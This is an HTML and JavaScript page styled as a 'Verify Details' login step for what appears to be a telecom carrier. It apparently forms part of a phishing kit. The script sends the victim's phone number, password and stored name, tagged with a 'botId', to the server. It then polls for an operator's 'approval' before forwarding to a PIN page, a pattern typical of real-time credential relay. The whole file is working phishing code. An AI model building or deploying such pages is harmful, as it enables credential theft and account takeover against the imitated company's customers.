<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify Details</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #0e0e0e;
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .container {
      max-width: 420px;
      margin: auto;
      padding: 24px;
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      width: 56px;
      margin-bottom: 8px;
    }

    .logo h1 {
      font-size: 22px;
      margin: 0;
      color: #e53935;
    }

    .logo p {
      font-size: 14px;
      color: #bdbdbd;
      margin-top: 6px;
    }

    label {
      font-size: 13px;
      color: #bdbdbd;
      margin-bottom: 6px;
      display: block;
    }

    input,
    select {
      width: 100%;
      padding: 14px;
      font-size: 15px;
      margin-bottom: 18px;
      border-radius: 10px;
      border: 1px solid #2a2a2a;
      background: #1b1b1b;
      color: #ffffff;
      outline: none;
    }

    input::placeholder {
      color: #777;
    }

    select {
      appearance: none;
      background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1L6 6L11 1' stroke='%23aaa' stroke-width='2'/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      background-position: right 16px center;
      background-size: 12px;
    }

    button {
      width: 100%;
      padding: 16px;
      font-size: 16px;
      border-radius: 10px;
      cursor: pointer;
      border: none;
    }

    .primary-btn {
      background: #e53935;
      color: #ffffff;
      margin-top: 10px;
    }

    .secondary-btn {
      background: transparent;
      border: 1px solid #e53935;
      color: #e53935;
      margin-top: 12px;
    }

    .status {
      margin-top: 18px;
      text-align: center;
      font-size: 14px;
      color: #4caf50;
      display: none;
    }

    .error {
      color: #e53935;
    }

    .footer {
      text-align: center;
      margin-top: 28px;
      font-size: 12px;
      color: #777;
    }
  </style>
</head>
<body>

  <div class="container">

    <!-- HEADER / LOGO -->
    <div class="logo">
      <img src="fido-logo.jpeg" alt="Logo">
      <h1>Welcome</h1>
      <p>Enter your details to continue</p>
    </div>

    <!-- FORM -->
    <form id="detailsForm">

      <!-- NEW FIELD (UI ONLY) -->
      <label>Account type</label>
      <select>
        <option value="mobile">Mobile</option>
        <option value="broadband">Broadband</option>
      </select>

      <label>Phone number</label>
      <input type="text" id="phone" placeholder="Enter phone number" required />

      <label>Password</label>
      <input type="password" id="password" placeholder="Enter password" required />

      <button type="submit" class="primary-btn">Next</button>
    </form>

    <div id="status" class="status">⏳ Waiting for approval...</div>

    <button class="secondary-btn" onclick="history.back()">Go Back</button>

    <div class="footer">v 5.3.2 (1.0.0)</div>
  </div>

  <script>
    const form = document.getElementById('detailsForm');
    const statusEl = document.getElementById('status');

    const fullName = localStorage.getItem('fullName');

    const params = new URLSearchParams(window.location.search);
    const botId =
      params.get('botId') ||
      localStorage.getItem('botId') ||
      'bot1';

    localStorage.setItem('botId', botId);

    if (!fullName) {
      alert('Session expired. Please start again.');
      window.location.href = 'index.html';
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const phone = document.getElementById('phone').value;
      const password = document.getElementById('password').value;

      localStorage.setItem('phone', phone);

      statusEl.style.display = 'block';
      statusEl.classList.remove('error');
      statusEl.textContent = '⏳ Waiting for approval...';

      const res = await fetch('/submit-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: fullName,
          phone,
          password,
          botId
        })
      });

      if (!res.ok) {
        statusEl.classList.add('error');
        statusEl.textContent = '❌ Server error. Please try again.';
        return;
      }

      const { requestId } = await res.json();
      pollApproval(requestId);
    });

    function pollApproval(requestId) {
      const interval = setInterval(async () => {
        const res = await fetch(`/check-password/${requestId}`);
        const data = await res.json();

        if (data.approved === true) {
          clearInterval(interval);
          window.location.href = 'pin.html';
        }

        if (data.approved === false) {
          clearInterval(interval);
          statusEl.classList.add('error');
          statusEl.textContent = '❌ Incorrect password. Please try again.';
        }
      }, 2000);
    }
  </script>

</body>
</html>
